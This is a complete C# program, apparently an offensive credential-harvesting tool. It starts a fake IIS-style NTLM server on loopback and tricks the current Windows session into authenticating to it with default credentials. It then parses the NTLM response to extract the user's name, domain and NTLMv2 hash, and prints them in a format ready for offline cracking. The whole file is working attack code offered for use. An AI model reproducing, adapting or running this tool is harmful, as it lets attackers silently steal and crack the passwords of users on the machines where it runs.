using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Sponder
{
    class Program
    {
        // The challenge to issue
        private static string challenge = "TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==";

        static void Main(string[] args)
        {
            // Start a TCP socket on the next available port
            TcpListener listener = new TcpListener(IPAddress.Loopback, 0);
            listener.Start();
            
            // Grab the port we are listening on
            int port = ((IPEndPoint)listener.LocalEndpoint).Port;

            // Spin up a new thread
            ThreadPool.QueueUserWorkItem(delegate
            {
                while (true)
                {
                    // Grab a socket
                    Socket socket = listener.AcceptSocket();

                    // The buffer to store the client's request into
                    int buffSize = 1024 * 4;
                    byte[] readInto = new byte[buffSize];

                    // Read in a bunch of bytes, and convert it to a string
                    int bytesRead = socket.Receive(readInto);
                    string response = System.Text.Encoding.Default.GetString(readInto);

                    // Locate if there was an NTLM Authorisation header
                    string NTLMHeaderLeft = "Authorization: NTLM ";
                    string NTLMHeaderRight = "\r\n";

                    int NTLMHeaderLeftPos = response.IndexOf(NTLMHeaderLeft);
                    int NTLMHeaderRightPos = response.IndexOf(NTLMHeaderRight, NTLMHeaderLeftPos + NTLMHeaderLeft.Length);

                    // Was there any header, if no, tell them to do NTLM auth:
                    if (NTLMHeaderLeftPos == -1 || NTLMHeaderRightPos == -1)
                    {
                        socket.Send(System.Text.Encoding.Default.GetBytes("HTTP/1.1 401 Unauthorized\r\n"));
                        socket.Send(System.Text.Encoding.Default.GetBytes("Server: Microsoft-IIS/7.5\r\n"));
                        socket.Send(System.Text.Encoding.Default.GetBytes("Content-Type: text/html\r\n"));
                        socket.Send(System.Text.Encoding.Default.GetBytes("Connection: Close\r\n"));
                        socket.Send(System.Text.Encoding.Default.GetBytes("WWW-Authenticate: NTLM\r\n"));
                        socket.Send(System.Text.Encoding.Default.GetBytes("Content-Length: 0\r\n"));
                        socket.Send(System.Text.Encoding.Default.GetBytes("\r\n"));
                        socket.Close();
                        continue;
                    }

                    // Move the header up
                    NTLMHeaderLeftPos += NTLMHeaderLeft.Length;

                    // Copy the NTLM data
                    string ntlmData = response.Substring(NTLMHeaderLeftPos, NTLMHeaderRightPos - NTLMHeaderLeftPos);

                    // Grab the RAW NTLM data
                    byte[] rawNtlm = Convert.FromBase64String(ntlmData);

                    // Grab the NTLM mode
                    var ntlmMode = rawNtlm[8];

                    // If NTLM mode is 1 then it means we need to send the challenge
                    if (ntlmMode == 1)
                    {
                        // Send the challenge
                        socket.Send(System.Text.Encoding.Default.GetBytes("HTTP/1.1 401 Unauthorized\r\n"));
                        socket.Send(System.Text.Encoding.Default.GetBytes("Server: Microsoft-IIS/7.5\r\n"));
                        socket.Send(System.Text.Encoding.Default.GetBytes("Content-Type: text/html\r\n"));
                        socket.Send(System.Text.Encoding.Default.GetBytes("Connection: Close\r\n"));
                        socket.Send(System.Text.Encoding.Default.GetBytes("WWW-Authenticate: NTLM " + challenge + "\r\n"));
                        socket.Send(System.Text.Encoding.Default.GetBytes("Content-Length: 0\r\n"));
                        socket.Send(System.Text.Encoding.Default.GetBytes("\r\n"));
                        socket.Close();
                        continue;
                    }

                    // Grab the challenge in a readable format
                    string challengeNice = ByteArrayToHexString(Convert.FromBase64String(challenge)).Substring(48, 16);

                    // Copy all the offsets out
                    int startFrom = 12;

                    // LM Hash offsets
                    short lmlen = BitConverter.ToInt16(rawNtlm, startFrom);
                    short lmmax = BitConverter.ToInt16(rawNtlm, startFrom + 2);
                    int lmoff = BitConverter.ToInt32(rawNtlm, startFrom + 4);

                    // NT Hash offsets
                    short ntlen = BitConverter.ToInt16(rawNtlm, startFrom + 8);
                    short ntmax = BitConverter.ToInt16(rawNtlm, startFrom + 10);
                    int ntoff = BitConverter.ToInt32(rawNtlm, startFrom + 12);

                    // Domain offsets
                    short domlen = BitConverter.ToInt16(rawNtlm, startFrom + 16);
                    short dommax = BitConverter.ToInt16(rawNtlm, startFrom + 18);
                    int domoff = BitConverter.ToInt32(rawNtlm, startFrom + 20);

                    // Username offsets
                    short userlen = BitConverter.ToInt16(rawNtlm, startFrom + 24);
                    short usermax = BitConverter.ToInt16(rawNtlm, startFrom + 26);
                    int useroff = BitConverter.ToInt32(rawNtlm, startFrom + 28);

                    // Grab hashes
                    string lmhash = ByteArrayToHexString(SubArray(rawNtlm, lmoff, lmlen));
                    string nthash = ByteArrayToHexString(SubArray(rawNtlm, ntoff, ntlen));

                    // Grab domain
                    string domain = System.Text.Encoding.Unicode.GetString(
                        SubArray(rawNtlm, domoff, domlen)
                    ).Replace("\x00", "");

                    // Grab username
                    string username = System.Text.Encoding.Unicode.GetString(
                        SubArray(rawNtlm, useroff, userlen)
                    ).Replace("\x00", "");

                    // Convert into a crackable hash
                    string crackableHash = username + "::" + domain + ":" + challengeNice + ":" + nthash.Substring(0, 32) + ":" + nthash.Substring(32);

                    // This is the hash
                    Console.WriteLine(crackableHash);

                    // Kill the socket
                    socket.Close();

                    // Exit
                    Environment.Exit(0);
                }
            }, null);

            // Allow the thread to spin up
            Thread.Sleep(1);

            try
            {
                WebRequest req = WebRequest.Create("http://127.0.0.1:" + port);
                req.Credentials = CredentialCache.DefaultCredentials;
                req.GetResponse();
            }
            catch
            {
                // do nothing
            }
        }

        // Function to convert a Byte Array to Hex
        public static string ByteArrayToHexString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        // Return a sub array
        public static byte[] SubArray(byte[] data, int index, int length)
        {
            byte[] result = new byte[length];
            Array.Copy(data, index, result, 0, length);
            return result;
        }
    }
}
